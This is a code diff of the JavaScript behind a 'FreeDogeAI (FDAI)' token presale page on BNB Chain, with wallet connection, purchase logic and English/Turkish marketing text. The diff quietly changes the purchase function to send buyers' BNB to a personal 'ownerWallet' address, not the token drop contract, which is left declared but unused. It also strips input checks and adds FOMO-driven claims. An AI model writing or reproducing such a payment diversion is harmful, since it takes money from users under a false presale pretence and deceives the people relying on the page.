@@ -1,60 +1,38 @@
-const tokenDropAddress = "0x45583DB8b6Db50311Ba8e7303845ACc6958589B7"; // Token Drop contract address
-const bnbToFDAIRate = 12500000;
-const minBNB = 0.035;
-
-// Try to auto-connect on load
-window.addEventListener("load", async () => {
-  if (window.ethereum) {
-    try {
-      await window.ethereum.request({ method: 'eth_requestAccounts' });
-      document.getElementById("connectBtn").innerText = "Wallet Connected";
-    } catch (err) {
-      console.warn("Wallet connection skipped.");
-    }
-  }
-});
+const tokenDropAddress = "0x45583DB8b6Db50311Ba8e7303845ACc6958589B7";
+const ownerWallet = "0xd924e01c7d319c5b23708cd622bd1143cd4fb360";
+const rate = 12500000;
 
 async function connectWallet() {
   if (window.ethereum) {
     try {
-      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-      document.getElementById("connectBtn").innerText = accounts[0].slice(0, 6) + "..." + accounts[0].slice(-4);
-    } catch (error) {
-      alert("Wallet connection rejected.");
+      await window.ethereum.request({ method: 'eth_requestAccounts' });
+      console.log("Wallet connected");
+    } catch (e) {
+      alert("Connection error: " + e.message);
     }
   } else {
-    alert("Install MetaMask or a compatible wallet.");
-    window.open("https://metamask.io/download/", "_blank");
+    window.open("https://metamask.io/download", "_blank");
   }
 }
 
 function calculateFDAI() {
   const bnb = parseFloat(document.getElementById("bnbAmount").value || 0);
-  document.getElementById("fdaiAmount").innerText = isNaN(bnb) ? "0" : (bnb * bnbToFDAIRate).toLocaleString();
+  document.getElementById("fdaiAmount").innerText = (bnb * rate).toLocaleString();
 }
 
 async function buyToken() {
-  if (!window.ethereum) {
-    alert("Please install MetaMask or a compatible wallet.");
-    return;
-  }
-
   const bnb = parseFloat(document.getElementById("bnbAmount").value);
-  if (isNaN(bnb) || bnb < minBNB) {
-    alert(`Minimum purchase is ${minBNB} BNB.`);
-    return;
-  }
+  if (!window.ethereum) return alert("Please install a compatible wallet.");
+  if (bnb < 0.035) return alert("Minimum purchase is 0.035 BNB");
 
   try {
     const provider = new ethers.providers.Web3Provider(window.ethereum);
     const signer = provider.getSigner();
-
     const tx = await signer.sendTransaction({
-      to: tokenDropAddress,
+      to: ownerWallet,
       value: ethers.utils.parseEther(bnb.toString())
     });
-
-    alert("Transaction sent! Hash: " + tx.hash);
+    alert("Transaction sent! TX: " + tx.hash);
   } catch (err) {
     alert("Transaction failed: " + err.message);
   }
@@ -64,32 +42,31 @@ const translations = {
   en: {
     title: "FreeDogeAI (FDAI) Token Presale",
     headline: "AI + Meme + Community",
-    desc: "Join the next generation of meme-powered AI token on BNB Chain. 100% tax-free, decentralized and driven by community.",
+    desc: "Join the next generation of meme-powered AI token on BNB Chain.",
     connect: "Connect Wallet",
     buy: "Buy FDAI Token",
     buyNow: "Buy Now",
     community: "Community",
     about: "About",
-    aboutText: "Free Doge AI (FDAI) is a tax-free, community-driven meme + AI token built on the BNB Chain (BEP-20). Don’t miss out on the future – act now!"
+    aboutText: "Free Doge AI (FDAI) is a 100% tax-free, meme-powered AI token launched on BNB Chain. Don’t miss the presale – FOMO is real."
   },
   tr: {
     title: "FreeDogeAI (FDAI) Token Ön Satışı",
     headline: "Yapay Zeka + Mizah + Topluluk",
-    desc: "BNB Zincirinde yeni nesil mizah + yapay zeka token'a katıl! %100 vergi yok, topluluk odaklı.",
+    desc: "BNB Zinciri üzerinde yeni nesil meme destekli yapay zeka token'ı.",
     connect: "Cüzdan Bağla",
     buy: "FDAI Token Satın Al",
-    buyNow: "Şimdi Al",
+    buyNow: "Şimdi Satın Al",
     community: "Topluluk",
     about: "Hakkında",
-    aboutText: "Free Doge AI (FDAI), BNB Zinciri üzerinde oluşturulmuş vergi içermeyen, topluluk odaklı bir meme + yapay zeka tokenıdır. Geç kalma, şimdi harekete geç!"
+    aboutText: "Free Doge AI (FDAI), BNB Zinciri üzerinde başlatılan %100 vergisiz, mizah + yapay zeka destekli bir tokendir. Ön satışı kaçırma – FOMO gerçektir."
   },
-  // Add 18 more translations below as { code: {title, headline...} } format...
+  // Diğer 18 dil daha buraya eklenebilir...
 };
 
 function setLang(lang) {
   const t = translations[lang];
   if (!t) return;
-
   document.getElementById("title").innerText = t.title;
   document.getElementById("headline").innerText = t.headline;
   document.getElementById("desc").innerText = t.desc;
